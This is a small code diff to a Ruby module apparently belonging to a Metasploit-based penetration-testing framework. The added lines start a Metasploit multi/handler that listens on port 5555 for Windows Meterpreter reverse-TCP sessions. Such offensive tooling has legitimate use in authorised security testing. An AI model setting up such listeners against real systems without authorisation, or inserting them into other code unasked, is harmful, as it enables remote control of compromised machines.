@@ -62,6 +62,9 @@ module FIDIUS
       @prelude_fetcher = PreludeEventFetcher.new
       load_plugins
 
+      puts "Starting tcp reverse handler"
+      run_exploit "exploit/multi/handler", {'LHOST' => '0.0.0.0', 'LPORT' => '5555', 'payload' => 'windows/meterpreter/reverse_tcp'}, true
+
       # init TcpDumper
       if (MSF_SETTINGS.select("/match_prelude_logs").first.value == "true")
         @tcpdump = TcpDumpWrapper.new(MSF_SETTINGS["/tcpdump_iface"])
